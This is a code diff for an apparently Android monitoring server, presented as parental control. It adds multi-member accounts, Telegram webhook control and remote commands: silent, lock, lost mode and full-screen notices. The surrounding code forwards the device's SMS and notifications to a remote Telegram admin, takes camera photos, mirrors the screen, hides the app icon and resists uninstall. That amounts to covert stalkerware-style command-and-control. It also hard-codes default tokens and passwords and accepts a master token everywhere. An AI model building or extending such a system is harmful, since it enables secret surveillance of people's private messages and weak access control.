@@ -14,7 +14,9 @@ process.on('unhandledRejection', (reason) => {
 const http        = require('http');
 const WebSocket   = require('ws');
 const path        = require('path');
+const crypto      = require('crypto');
 const TelegramBot = require('node-telegram-bot-api');
+const db          = require('./db');
 
 const PORT           = process.env.PORT         || 3000;
 const SECURITY_TOKEN = process.env.SHIELD_TOKEN || "GAJARBOTOL80";
@@ -22,25 +24,118 @@ const BOT_TOKEN      = process.env.BOT_TOKEN    || "";
 const ADMIN_TG_ID    = Number(process.env.ADMIN_TG_ID) || 5197344486;
 const PANEL_PASSWORD = process.env.PANEL_PASSWORD || "Shield@2025";
 const PUBLIC_URL     = (process.env.PUBLIC_URL  || "").replace(/\/$/, "");
+const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET || "shield-hook-secret";
 
 const app = express();
 const server = http.createServer(app);
-app.use(express.json());
+app.use(express.json({ limit: '2mb' }));
 
-// ── Simple session store (in-memory) ──────────────────────────────────────
-const activeSessions = new Set();
+// ════════════════════════════════════════════════════════════════════
+// MULTI-TENANT MEMBERSHIP
+// Each membership user gets: /ws/<username> (device link), /<username>
+// (admin panel), and an entry in the users table. Devices are tagged with
+// their owner so panels and bots never see another member's devices.
+// ════════════════════════════════════════════════════════════════════
+const tenants = new Map(); // username -> tenant
 
-function generateToken() {
-  return Math.random().toString(36).substring(2) + Date.now().toString(36);
+function addTenant(user) {
+  const t = {
+    username: user.username,
+    displayName: user.displayName || user.username,
+    adminTgId: String(user.adminTgId || ''),
+    deviceToken: user.deviceToken || '',
+    botToken: user.botToken || '',
+    isActive: user.isActive !== false,
+    bot: null, // optional per-tenant Telegram bot
+    createdAt: user.createdAt || Date.now(),
+  };
+  tenants.set(t.username, t);
+  return t;
 }
 
+async function loadTenants() {
+  try {
+    const users = await db.listUsers();
+    tenants.clear();
+    users.forEach(addTenant);
+    console.log(`[TENANTS] Loaded ${tenants.size} member(s) from ${db.getMode()} store`);
+  } catch (e) {
+    console.error('[TENANTS] load failed:', e.message);
+  }
+}
+
+function getTenant(username) {
+  return tenants.get(db.normalizeUsername(username)) || null;
+}
+
+function getTenantByChatId(chatId) {
+  const id = String(chatId);
+  for (const t of tenants.values()) if (t.adminTgId && t.adminTgId === id) return t;
+  return null;
+}
+
+function isSuperAdmin(chatId) { return String(chatId) === String(ADMIN_TG_ID); }
+
+function publicUser(u) {
+  return {
+    username: u.username,
+    displayName: u.displayName,
+    adminTgId: u.adminTgId,
+    deviceToken: u.deviceToken,
+    hasBotToken: !!u.botToken,
+    isActive: u.isActive !== false,
+    createdAt: u.createdAt,
+    lastLogin: u.lastLogin,
+    devicesOnline: countDevicesOf(u.username),
+  };
+}
+
+function countDevicesOf(owner) {
+  let n = 0;
+  for (const d of childDevices.values()) if (d.owner === owner) n++;
+  return n;
+}
+
+function userLinks(u) {
+  const base = PUBLIC_URL || `http://localhost:${PORT}`;
+  return {
+    panel: `${base}/${u.username}`,
+    deviceWs: `${base.replace(/^http/, 'ws')}/ws/${u.username}`,
+    webhook: `${base}/webhook/${WEBHOOK_SECRET}`,
+    deviceToken: u.deviceToken,
+  };
+}
+
+// ── Sessions (in-memory) ─────────────────────────────────────────────────
+// token -> { user: <username|null>, ts }   (null user = super admin)
+const activeSessions = new Map();
+const SESSION_TTL = 24 * 60 * 60 * 1000;
+
+function generateToken() {
+  return crypto.randomBytes(24).toString('hex');
+}
+
+function createSession(user) {
+  const token = generateToken();
+  activeSessions.set(token, { user: user || null, ts: Date.now() });
+  setTimeout(() => activeSessions.delete(token), SESSION_TTL);
+  return token;
+}
+
+function getSession(token) {
+  if (!token) return null;
+  const s = activeSessions.get(token);
+  if (!s) return null;
+  if (Date.now() - s.ts > SESSION_TTL) { activeSessions.delete(token); return null; }
+  return s;
+}
+
+// ── Super-admin (master) auth ────────────────────────────────────────────
 app.post('/api/login', (req, res) => {
-  const { password } = req.body;
+  const { password } = req.body || {};
   if (password === PANEL_PASSWORD) {
-    const token = generateToken();
-    activeSessions.add(token);
-    setTimeout(() => activeSessions.delete(token), 24 * 60 * 60 * 1000);
-    res.json({ success: true, token });
+    const token = createSession(null);
+    res.json({ success: true, token, role: 'super' });
   } else {
     res.status(401).json({ success: false, message: "Wrong password" });
   }
@@ -53,15 +148,126 @@ app.post('/api/logout', (req, res) => {
 });
 
 app.get('/api/auth-check', (req, res) => {
-  const token = req.headers['x-shield-token'];
-  res.json({ valid: token && activeSessions.has(token) });
+  const s = getSession(req.headers['x-shield-token']);
+  res.json({ valid: !!s, role: s ? (s.user ? 'user' : 'super') : null, user: s ? s.user : null });
 });
 
 app.get('/api/status', (req, res) => {
-  res.json({ devices: childDevices.size, uptime: process.uptime(), botActive: !!bot });
+  res.json({
+    devices: childDevices.size, tenants: tenants.size,
+    uptime: process.uptime(), botActive: !!bot, db: db.getMode()
+  });
+});
+
+// ── Super-admin: user management ─────────────────────────────────────────
+function requireSuper(req, res) {
+  const s = getSession(req.headers['x-shield-token']);
+  if (!s || s.user) { res.status(401).json({ success: false, message: 'Super-admin auth required' }); return null; }
+  return s;
+}
+
+app.get('/api/users', async (req, res) => {
+  if (!requireSuper(req, res)) return;
+  try {
+    const users = await db.listUsers();
+    res.json({ success: true, db: db.getMode(), users: users.map(publicUser) });
+  } catch (e) {
+    res.status(500).json({ success: false, message: e.message });
+  }
+});
+
+app.post('/api/users', async (req, res) => {
+  if (!requireSuper(req, res)) return;
+  try {
+    const { username, password, displayName, adminTgId, botToken } = req.body || {};
+    const user = await db.createUser({ username, password, displayName, adminTgId, botToken });
+    addTenant(user);
+    res.json({ success: true, user: publicUser(user), links: userLinks(user) });
+  } catch (e) {
+    res.status(400).json({ success: false, message: e.message });
+  }
+});
+
+app.patch('/api/users/:username', async (req, res) => {
+  if (!requireSuper(req, res)) return;
+  try {
+    const user = await db.updateUser(req.params.username, req.body || {});
+    tenants.delete(user.username);
+    addTenant(user);
+    res.json({ success: true, user: publicUser(user) });
+  } catch (e) {
+    res.status(400).json({ success: false, message: e.message });
+  }
+});
+
+app.delete('/api/users/:username', async (req, res) => {
+  if (!requireSuper(req, res)) return;
+  try {
+    const t = tenants.get(db.normalizeUsername(req.params.username));
+    if (t && t.bot) { try { t.bot.closeWebHook ? t.bot.closeWebHook() : null; } catch (_) {} }
+    await db.deleteUser(req.params.username);
+    tenants.delete(db.normalizeUsername(req.params.username));
+    res.json({ success: true });
+  } catch (e) {
+    res.status(400).json({ success: false, message: e.message });
+  }
+});
+
+// ── Per-member auth ──────────────────────────────────────────────────────
+app.post('/api/:user/login', async (req, res) => {
+  const username = db.normalizeUsername(req.params.user);
+  const t = tenants.get(username);
+  const user = await db.getUser(username);
+  if (!t || !user || !user.isActive) return res.status(401).json({ success: false, message: 'No such account' });
+  const { password } = req.body || {};
+  if (!db.verifyPassword(user, password)) return res.status(401).json({ success: false, message: 'Wrong password' });
+  db.updateUser(username, { lastLogin: Date.now() }).catch(() => {});
+  const token = createSession(username);
+  res.json({
+    success: true, token, role: 'user', username,
+    displayName: user.displayName, deviceToken: t.deviceToken,
+  });
+});
+
+app.post('/api/:user/logout', (req, res) => {
+  const token = req.headers['x-shield-token'];
+  if (token) activeSessions.delete(token);
+  res.json({ success: true });
+});
+
+app.get('/api/:user/auth-check', (req, res) => {
+  const s = getSession(req.headers['x-shield-token']);
+  const want = db.normalizeUsername(req.params.user);
+  const ok = !!s && s.user === want;
+  res.json({ valid: ok, role: 'user', user: ok ? s.user : null });
+});
+
+// ── Telegram webhook ─────────────────────────────────────────────────────
+// Enabled when PUBLIC_URL is configured; otherwise the bot runs in polling mode.
+app.post('/webhook/:secret', (req, res) => {
+  if (!WEBHOOK_SECRET || req.params.secret !== WEBHOOK_SECRET) {
+    return res.status(403).json({ ok: false });
+  }
+  if (!bot || typeof bot.processUpdate !== 'function') {
+    return res.status(503).json({ ok: false });
+  }
+  try {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+  } catch (e) {
+    console.error('[BOT] processUpdate error:', e.message);
+    res.sendStatus(200);
+  }
 });
 
 app.use(express.static(path.join(__dirname, 'public')));
+
+// Serve the same SPA for a member's panel URL, e.g. /kawsar
+app.get('/:user', (req, res, next) => {
+  const u = db.normalizeUsername(req.params.user);
+  if (!tenants.has(u)) return next();
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
 
 const wss = new WebSocket.Server({ noServer: true });
 
@@ -698,8 +904,8 @@ function notifyAdminSms(deviceId, childName, sender, body, time) {
       `💬 *Incoming SMS — ${escapeMd(childName)}*\n\n` +
        `From: \`${escapeMdCode(sender)}\`\n` +
       `Time: ${t}\n\n` +
-      `"${body.length > 200 ? escapeMd(body.slice(0,200))+'…' : escapeMd(body)}"`,
-      { reply_markup: { inline_keyboard: [[{ text: `📱 View ${childName}`, callback_data: `sel:${deviceId}` }]] } }
+       `"${body.length > 200 ? escapeMd(body.slice(0,200))+'…' : escapeMd(body)}"`,
+      { deviceId, reply_markup: { inline_keyboard: [[{ text: `📱 View ${childName}`, callback_data: `sel:${deviceId}` }]] } }
     );
   } catch (e) { console.error('[BOT] SMS notify error:', e.message); }
 }
@@ -824,8 +1030,17 @@ function initTelegramBot() {
     return;
   }
   try {
-    bot = new TelegramBot(BOT_TOKEN, { polling: true });
-    console.log("[BOT] Telegram bot started.");
+    // Webhook mode when a public URL is available (far lighter than polling);
+    // falls back to polling for local development.
+    if (PUBLIC_URL) {
+      bot = new TelegramBot(BOT_TOKEN, { webHook: true });
+      bot.setWebHook(`${PUBLIC_URL}/webhook/${WEBHOOK_SECRET}`)
+        .then(() => console.log(`[BOT] Telegram bot started (webhook: ${PUBLIC_URL}/webhook/${WEBHOOK_SECRET})`))
+        .catch(e => console.error('[BOT] setWebHook failed:', e.message));
+    } else {
+      bot = new TelegramBot(BOT_TOKEN, { polling: true });
+      console.log("[BOT] Telegram bot started (polling — set PUBLIC_URL to use webhook).");
+    }
   } catch (err) {
     console.error("[BOT] Failed to start Telegram bot:", err.message);
     return;
@@ -839,7 +1054,25 @@ function initTelegramBot() {
     return chatState.get(chatId);
   }
 
-  function isAdmin(chatId) { return String(chatId) === String(ADMIN_TG_ID); }
+  // A chat is allowed if it is the super admin or a member's linked admin id.
+  function isAdmin(chatId) { return isSuperAdmin(chatId) || !!getTenantByChatId(chatId); }
+
+  // Tenant whose devices this chat may control (null = super admin sees all).
+  function tenantFor(chatId) { return getTenantByChatId(chatId); }
+
+  // Device ids visible to a chat.
+  function devicesFor(chatId) {
+    const t = tenantFor(chatId);
+    if (!t) return [...childDevices.entries()]; // super admin
+    return [...childDevices.entries()].filter(([, d]) => d.owner === t.username);
+  }
+
+  function canTouch(chatId, deviceId) {
+    const t = tenantFor(chatId);
+    if (!t) return true;
+    const d = childDevices.get(deviceId);
+    return !!d && d.owner === t.username;
+  }
 
   function adminOnly(msg, cb) {
     if (!isAdmin(msg.chat.id)) { bot.sendMessage(msg.chat.id, "⛔ Access denied."); return; }
@@ -862,10 +1095,11 @@ function initTelegramBot() {
     persistent: true,
   };
 
-  function deviceListInlineKB() {
-    if (childDevices.size === 0) return { inline_keyboard: [] };
+  function deviceListInlineKB(entries) {
+    const list = entries || [...childDevices.entries()];
+    if (list.length === 0) return { inline_keyboard: [] };
     const rows = [];
-    for (const [id, dev] of childDevices.entries()) {
+    for (const [id, dev] of list) {
       const bat = dev.battery || 0;
       const batStyle = bat > 60 ? "success" : bat > 20 ? "primary" : "danger";
       const batIcon = bat > 60 ? CUSTOM_EMOJI.green : bat > 20 ? CUSTOM_EMOJI.yellow : CUSTOM_EMOJI.red;
@@ -952,6 +1186,14 @@ function initTelegramBot() {
         btn("WiFi OFF", { callback_data: `act:wifi_off:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.wifi }),
       ],
       [
+        btn("Silent", { callback_data: `act:ringer_silent:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.bell }),
+        btn("Vibrate", { callback_data: `act:ringer_vibrate:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.bell }),
+        btn("Ringer ON", { callback_data: `act:ringer_normal:${deviceId}`, style: "success", icon: CUSTOM_EMOJI.bell }),
+      ],
+      [
+        btn("Lost Mode", { callback_data: `act:lost_mode:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.lock }),
+      ],
+      [
         btn("Block App", { callback_data: `act:block_app:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.ban }),
         btn("Unblock App", { callback_data: `act:unblock_app:${deviceId}`, style: "success", icon: CUSTOM_EMOJI.check }),
       ],
@@ -963,6 +1205,7 @@ function initTelegramBot() {
       ],
       [
         btn("Show Toast", { callback_data: `act:toast:${deviceId}`, icon: CUSTOM_EMOJI.megaphone }),
+        btn("Full Notice", { callback_data: `act:notice:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.megaphone }),
         btn("Refresh", { callback_data: `sel:${deviceId}`, style: "success", icon: CUSTOM_EMOJI.refresh }),
       ],
     ];
@@ -987,15 +1230,16 @@ function initTelegramBot() {
   }
 
   function sendDeviceList(chatId, editMsgId = null) {
-    const text = childDevices.size === 0
+    const list = devicesFor(chatId);
+    const text = list.length === 0
       ? `📵 *Kono device connected nai.*\n\nBacchar phone e Shield app chole thakle auto connect hobe.`
-      : `📱 *Connected Devices — ${childDevices.size} ta*\n\nSelect koro manage korte:`;
+      : `📱 *Connected Devices — ${list.length} ta*\n\nSelect koro manage korte:`;
 
     const opts = {
       parse_mode: "Markdown",
-      reply_markup: childDevices.size === 0
+      reply_markup: list.length === 0
         ? { inline_keyboard: [[{ text: "🔄 Refresh", callback_data: "menu:devices" }]] }
-        : deviceListInlineKB()
+        : deviceListInlineKB(list)
     };
 
     if (editMsgId) {
@@ -1085,6 +1329,71 @@ function initTelegramBot() {
     const chatId = msg.chat.id;
     const text   = msg.text.trim();
     const state  = getState(chatId);
+
+    // ── Super-admin: membership user management ─────────────────────────
+    if (isSuperAdmin(chatId) && text.startsWith('/')) {
+      const [rawCmd, ...args] = text.split(/\s+/);
+      const cmdName = rawCmd.replace(/@[\w_]+$/, '').toLowerCase();
+      const isUserCmd = ['/newuser', '/users', '/deluser', '/resetpw'].includes(cmdName);
+      if (isUserCmd) {
+        try {
+          if (cmdName === '/users') {
+            const users = await db.listUsers();
+            if (!users.length) {
+              bot.sendMessage(chatId, "Kono member nai. `/newuser <username> <password> [name]` diye banao.", { parse_mode: 'Markdown' });
+              return;
+            }
+            const lines = users.map(u => {
+              const L = userLinks(u);
+              return `👤 *${escapeMd(u.username)}*${u.displayName ? ' (' + escapeMd(u.displayName) + ')' : ''}\n` +
+                     `   ${u.isActive ? '🟢 active' : '🔴 disabled'} · devices: ${countDevicesOf(u.username)}\n` +
+                     `   🖥️ ${L.panel}\n   🔌 ${L.deviceWs}`;
+            });
+            bot.sendMessage(chatId, `👥 *Members (${users.length})*\n\n` + lines.join('\n\n'),
+              { parse_mode: 'Markdown', disable_web_page_preview: true });
+            return;
+          }
+          if (cmdName === '/newuser') {
+            const [username, password, ...rest] = args;
+            if (!username || !password) {
+              bot.sendMessage(chatId, "Usage: `/newuser <username> <password> [display name]`", { parse_mode: 'Markdown' });
+              return;
+            }
+            const user = await db.createUser({ username, password, displayName: rest.join(' ') || username });
+            addTenant(user);
+            const L = userLinks(user);
+            bot.sendMessage(chatId,
+              `✅ *Member created: ${escapeMd(user.username)}*\n\n` +
+              `🖥️ Panel: ${L.panel}\n🔌 Device WS: ${L.deviceWs}\n🔑 Device token: \`${L.deviceToken}\`\n\n` +
+              `APK te ei device token tao dao.`,
+              { parse_mode: 'Markdown', disable_web_page_preview: true });
+            return;
+          }
+          if (cmdName === '/deluser') {
+            const username = args[0];
+            if (!username) { bot.sendMessage(chatId, "Usage: `/deluser <username>`", { parse_mode: 'Markdown' }); return; }
+            const norm = db.normalizeUsername(username);
+            await db.deleteUser(norm);
+            const t = tenants.get(norm);
+            if (t && t.bot) { try { t.bot.closeWebHook ? t.bot.closeWebHook() : null; } catch (_) {} }
+            tenants.delete(norm);
+            bot.sendMessage(chatId, `🗑️ Member \`${norm}\` deleted.`, { parse_mode: 'Markdown' });
+            return;
+          }
+          if (cmdName === '/resetpw') {
+            const [username, password] = args;
+            if (!username || !password) { bot.sendMessage(chatId, "Usage: `/resetpw <username> <new password>`", { parse_mode: 'Markdown' }); return; }
+            const user = await db.updateUser(username, { password });
+            tenants.delete(user.username); addTenant(user);
+            bot.sendMessage(chatId, `🔑 Password reset for \`${user.username}\`.`, { parse_mode: 'Markdown' });
+            return;
+          }
+        } catch (e) {
+          bot.sendMessage(chatId, `❌ ${escapeMd(e.message)}`, { parse_mode: 'Markdown' });
+          return;
+        }
+      }
+    }
 
     if (text === '/start' || text.startsWith('/start@')) {
       state.awaitingInput = null;
@@ -1242,6 +1551,23 @@ function initTelegramBot() {
       return;
     }
 
+    if (state.awaitingInput === 'notice') {
+      state.awaitingInput = null;
+      const devId = state.selectedDeviceId;
+      const dev   = childDevices.get(devId);
+      const msg   = text.trim();
+      if (!msg) {
+        bot.sendMessage(chatId, "❌ Message khali — abar type koro.");
+        return;
+      }
+      sendCommandToDevice(devId, { command: "show_notice", message: msg, duration: 10 });
+      bot.sendMessage(chatId,
+        `🖥️ Full-screen notice \`10s\` pathano hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n💬 \`${escapeMdCode(msg)}\``,
+        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🛑 Dismiss Now", callback_data: `act:dismiss_notice:${devId}` }], [{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
+      );
+      return;
+    }
+
     // ── Reply keyboard button text handlers ──────────────────────────────
     if (text === "📱 Devices" || text === "Devices")  { sendDeviceList(chatId); return; }
     if (text === "📊 Status" || text === "Status")   { sendStatus(chatId); return; }
@@ -1296,6 +1622,14 @@ function initTelegramBot() {
     const msgId  = query.message.message_id;
     const data   = query.data;
     const state  = getState(chatId);
+
+    // ── Tenant isolation guard ───────────────────────────────────────
+    // If this callback references a device, the chat must own it.
+    const referencedDevice = [...childDevices.keys()].find(id => data && data.includes(id));
+    if (referencedDevice && !canTouch(chatId, referencedDevice)) {
+      bot.answerCallbackQuery(query.id, { text: "⛔ Not your device", show_alert: true }).catch(() => {});
+      return;
+    }
 
     // ── menu: navigation ─────────────────────────────────────────────
     if (data === "menu:devices") {
@@ -1636,11 +1970,54 @@ Kon inbox dekhte chao?`, {
         return;
       }
 
+      // full-screen notice (blocking overlay, needs Display-over-other-apps)
+      if (action === "notice") {
+        state.selectedDeviceId = deviceId;
+        state.awaitingInput    = "notice";
+        bot.answerCallbackQuery(query.id, { text: "🖥️ Notice message type koro" });
+        bot.sendMessage(chatId,
+          `🖥️ *Full-screen Notice — ${escapeMd(dev.childName)}*\n\n` +
+          `Puro screen dhake emon message likho (10 second dekhabe):\n\n` +
+          `Example: \`Porikkha somoy phone bondho koro\``,
+          { parse_mode: "Markdown" }
+        );
+        return;
+      }
+      if (action === "dismiss_notice") {
+        bot.answerCallbackQuery(query.id, { text: "🛑 Dismissing notice" });
+        sendCommandToDevice(deviceId, { command: "dismiss_notice" });
+        return;
+      }
+
       // torch on/off
       if (action === "torch_on" || action === "torch_off") {
         const on = action === "torch_on";
         bot.answerCallbackQuery(query.id, { text: on ? "🔦 Turning on torch…" : "🔦 Turning off torch…" });
         sendCommandToDevice(deviceId, { command: action });
+        return;
+      }
+
+      // ringer mode: silent / vibrate / normal
+      if (action === "ringer_silent" || action === "ringer_vibrate" || action === "ringer_normal") {
+        const mode = action.replace("ringer_", "");
+        const labels = { silent: "🔕 Silent", vibrate: "📳 Vibrate", normal: "🔔 Ringer ON" };
+        bot.answerCallbackQuery(query.id, { text: `${labels[mode]} set…` });
+        sendCommandToDevice(deviceId, { command: "set_ringer", mode });
+        bot.sendMessage(chatId, `${labels[mode]} — *${escapeMd(getDeviceName(deviceId))}*`, { parse_mode: "Markdown" });
+        return;
+      }
+
+      // lost mode: lock + loud ring + on-screen message
+      if (action === "lost_mode") {
+        bot.answerCallbackQuery(query.id, { text: "🚨 Lost Mode activated…", show_alert: true });
+        sendCommandToDevice(deviceId, { command: "lock" });
+        sendCommandToDevice(deviceId, { command: "ring", duration: 30 });
+        sendCommandToDevice(deviceId, { command: "show_toast", message: "This device has been locked by your parent." });
+        bot.sendMessage(chatId,
+          `🚨 *Lost Mode — ${escapeMd(getDeviceName(deviceId))}*\n\n` +
+          `🔒 Screen locked\n🔔 Loud ring (30s)\n💬 Message shown on screen\n\n` +
+          `_Use "Ringer ON" + "Unlock" after the device is found._`,
+          { parse_mode: "Markdown" });
         return;
       }
 
@@ -2069,11 +2446,27 @@ Nischit delete korte chao?`,
 }
 
 // ── Bot notification helpers ─────────────────────────────────────────────
+// When opts.deviceId is given, the alert is routed to that device's owner
+// (member admin chat), otherwise it goes to the super admin.
 function notifyAdmin(text, opts = {}) {
   if (!bot) return;
-  bot.sendMessage(ADMIN_TG_ID, text, { parse_mode: "Markdown", ...opts }).catch(e => {
-    console.error("[BOT] notify error:", e.message);
-  });
+  const { deviceId, owner: ownerOpt, ...sendOpts } = opts || {};
+  const targets = new Set();
+
+  const owner = ownerOpt || (deviceId && childDevices.has(deviceId) ? childDevices.get(deviceId).owner : null);
+  if (owner && owner !== 'master') {
+    const t = tenants.get(owner);
+    if (t && t.adminTgId) targets.add(String(t.adminTgId));
+    else targets.add(String(ADMIN_TG_ID)); // member has no linked chat yet
+  } else {
+    targets.add(String(ADMIN_TG_ID));
+  }
+
+  for (const chat of targets) {
+    bot.sendMessage(chat, text, { parse_mode: "Markdown", ...sendOpts }).catch(e => {
+      console.error("[BOT] notify error:", e.message);
+    });
+  }
 }
 
 function notifyDeviceConnected(deviceId, childName, battery) {
@@ -2084,6 +2477,7 @@ function notifyDeviceConnected(deviceId, childName, battery) {
     `🆔 ID: \`${deviceId}\`\n\n` +
     `Quick select: tap below`,
     {
+      deviceId,
       reply_markup: {
         inline_keyboard: [[
           btn(`Manage ${childName}`, { callback_data: `sel:${deviceId}`, style: 'primary', icon: CUSTOM_EMOJI.phone })
@@ -2094,7 +2488,7 @@ function notifyDeviceConnected(deviceId, childName, battery) {
 }
 
 function notifyDeviceDisconnected(deviceId, childName) {
-  notifyAdmin(`🔴 *Device Disconnected*\n\n👦 *${escapeMd(childName)}* (\`${deviceId}\`) offline hoy gese.`);
+  notifyAdmin(`🔴 *Device Disconnected*\n\n👦 *${escapeMd(childName)}* (\`${deviceId}\`) offline hoy gese.`, { deviceId });
 }
 
 function notifyAppBlocked(deviceId, childName, appName, packageName, time) {
@@ -2104,6 +2498,7 @@ function notifyAppBlocked(deviceId, childName, appName, packageName, time) {
     `📦 App: *${escapeMd(appName)}*\n` +
     `🕐 Time: ${time}`,
     {
+      deviceId,
       reply_markup: {
         inline_keyboard: [[
           { text: `📱 View ${childName}`, callback_data: `sel:${deviceId}` }
@@ -2118,6 +2513,7 @@ function notifyBatteryLow(deviceId, childName, battery) {
     `🔴 *Low Battery Warning!*\n\n` +
     `👦 *${escapeMd(childName)}*: battery *${battery}%* only!`,
     {
+      deviceId,
       reply_markup: {
         inline_keyboard: [[
           btn('Lock Device', { callback_data: `act:lock:${deviceId}`, style: 'danger', icon: CUSTOM_EMOJI.lock })
@@ -2134,7 +2530,7 @@ function notifyCommandAck(deviceId, childName, command, success, message) {
     hide_icon: "Hide Icon", unhide_icon: "Restore Icon", update_policy: "Policy Update"
   };
   const label = cmdNames[command] || command;
-  notifyAdmin(`${icon} *${label}* [${escapeMd(childName)}]\n${escapeMd(message)}`);
+  notifyAdmin(`${icon} *${label}* [${escapeMd(childName)}]\n${escapeMd(message)}`, { deviceId });
 }
 
 // ── Send command to child device ─────────────────────────────────────────
@@ -2367,38 +2763,54 @@ function normalizeFeatureResponse(payload) {
 // WEB ADMIN HELPERS
 // ════════════════════════════════════════════════════════════════════
 
-function getSanitizedDeviceList() {
-  return [...childDevices.entries()].map(([id, dev]) => ({
-    id,
-    childName:        dev.childName,
-    battery:          dev.battery,
-    activeApp:        dev.activeApp,
-    lastSeen:         dev.lastSeen,
-    isMirroring:      dev.isMirroring,
-    lastFrame:        dev.lastFrame,
-    screenTimeUsedMin: dev.screenTimeUsedMin || 0,
-    screenTimeLimitMin: dev.screenTimeLimitMin || 0,
-    blockedApps:      dev.blockedApps || "",
-    blockedKeywords:  dev.blockedKeywords || "",
-    storage:          dev.storage || "—",
-    ringerMode:       dev.ringerMode || "—",
-    networkType:      dev.networkType || "—",
-    screenState:      dev.screenState || "—",
-    uninstallGuard:   dev.uninstallGuard !== undefined ? dev.uninstallGuard : true,
-  }));
+function getSanitizedDeviceList(owner = null) {
+  return [...childDevices.entries()]
+    .filter(([, dev]) => owner == null || owner === 'master' || dev.owner === owner)
+    .map(([id, dev]) => ({
+      id,
+      childName:        dev.childName,
+      battery:          dev.battery,
+      activeApp:        dev.activeApp,
+      lastSeen:         dev.lastSeen,
+      isMirroring:      dev.isMirroring,
+      lastFrame:        dev.lastFrame,
+      screenTimeUsedMin: dev.screenTimeUsedMin || 0,
+      screenTimeLimitMin: dev.screenTimeLimitMin || 0,
+      blockedApps:      dev.blockedApps || "",
+      blockedKeywords:  dev.blockedKeywords || "",
+      storage:          dev.storage || "—",
+      ringerMode:       dev.ringerMode || "—",
+      networkType:      dev.networkType || "—",
+      screenState:      dev.screenState || "—",
+      uninstallGuard:   dev.uninstallGuard !== undefined ? dev.uninstallGuard : true,
+      owner:            dev.owner || 'master',
+    }));
 }
 
+// Each admin socket only receives the devices it is allowed to see.
 function broadcastDeviceList() {
-  const data = JSON.stringify({ type: "device_list", devices: getSanitizedDeviceList() });
   for (const ws of adminSockets) {
-    if (ws.readyState === WebSocket.OPEN) ws.send(data);
+    if (ws.readyState !== WebSocket.OPEN) continue;
+    const data = JSON.stringify({ type: "device_list", devices: getSanitizedDeviceList(ws._owner || 'master') });
+    ws.send(data);
   }
 }
 
+function ownerOf(payload) {
+  if (payload.owner) return payload.owner;
+  if (payload.deviceId && childDevices.has(payload.deviceId)) return childDevices.get(payload.deviceId).owner;
+  return null;
+}
+
 function broadcastToAdmins(payload) {
+  const owner = ownerOf(payload);
   const data = JSON.stringify(payload);
   for (const ws of adminSockets) {
-    if (ws.readyState === WebSocket.OPEN) ws.send(data);
+    if (ws.readyState !== WebSocket.OPEN) continue;
+    const wsOwner = ws._owner || 'master';
+    // Super-admin ('master') sees everything; members only their own devices.
+    if (owner && wsOwner !== 'master' && wsOwner !== owner) continue;
+    ws.send(data);
   }
 }
 
@@ -2410,9 +2822,13 @@ const pendingBotFileRequests = new Map();
 // ════════════════════════════════════════════════════════════════════
 
 wss.on('connection', (ws, req) => {
+  const tenant     = req && req._tenant ? req._tenant : null;
+  const ownerName  = tenant ? tenant.username : 'master';
   let isAuthorized = false;
   let deviceId     = null;
   let clientRole   = null;
+
+  ws._owner = ownerName;
 
   ws.on('message', (message) => {
     try {
@@ -2420,8 +2836,16 @@ wss.on('connection', (ws, req) => {
 
       // ── Auth ────────────────────────────────────────────────────
       if (payload.type === 'auth') {
-        if (payload.token !== SECURITY_TOKEN) {
+        // Member devices and panels authenticate with that member's device
+        // token; the master token (super admin) is accepted everywhere.
+        const expected = tenant ? tenant.deviceToken : SECURITY_TOKEN;
+        if (payload.token !== expected && payload.token !== SECURITY_TOKEN) {
           ws.send(JSON.stringify({ type: "error", message: "Invalid security key" }));
+          ws.close();
+          return;
+        }
+        if (tenant && !tenant.isActive) {
+          ws.send(JSON.stringify({ type: "error", message: "Account disabled" }));
           ws.close();
           return;
         }
@@ -2437,17 +2861,22 @@ wss.on('connection', (ws, req) => {
             activeApp: "System Launcher", lastSeen: Date.now(),
             isMirroring: false, lastFrame: null,
             screenTimeUsedMin: 0, screenTimeLimitMin: 0, blockedApps: "",
-            uninstallGuard: true
+            uninstallGuard: true,
+            owner: ownerName,
           });
 
-          console.log(`[WS] Android connected: "${deviceId}" (${friendlyName})`);
+          console.log(`[WS] Android connected: "${deviceId}" (${friendlyName}) owner=${ownerName}`);
           broadcastDeviceList();
           notifyDeviceConnected(deviceId, friendlyName, 100);
 
         } else if (clientRole === 'admin') {
           adminSockets.add(ws);
-          console.log(`[WS] Web admin connected`);
-          ws.send(JSON.stringify({ type: "device_list", devices: getSanitizedDeviceList() }));
+          console.log(`[WS] Web admin connected (owner=${ownerName})`);
+          ws.send(JSON.stringify({
+            type: "device_list",
+            devices: getSanitizedDeviceList(ownerName),
+            owner: ownerName,
+          }));
         }
         return;
       }
@@ -2518,7 +2947,7 @@ wss.on('connection', (ws, req) => {
               dev._lastNotifKey = notifKey;
               notifyAdmin(
                 `🔔 *Notification — ${escapeMd(dev.childName)}*\n\n📱 App: \`${escapeMdCode(appLabel)}\`\n📝 ${escapeMd(msgTitle)}\n💬 ${msgText.length > 200 ? escapeMd(msgText.slice(0,200))+'…' : escapeMd(msgText)}\n🕐 ${notifTime}`,
-                { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
+                { deviceId, reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
               );
             }
           }
@@ -2570,7 +2999,7 @@ wss.on('connection', (ws, req) => {
 
         } else if (payload.type === 'take_photo_result') {
           broadcastToAdmins({ ...payload, deviceId });
-          if (bot) notifyAdmin(`❌ *Camera capture failed* — ${escapeMd(dev.childName)}\n${escapeMd(payload.error || 'Unknown error')}`);
+          if (bot) notifyAdmin(`❌ *Camera capture failed* — ${escapeMd(dev.childName)}\n${escapeMd(payload.error || 'Unknown error')}`, { deviceId });
 
         } else if (payload.type === 'photo_result') {
           broadcastToAdmins({ ...payload, deviceId });
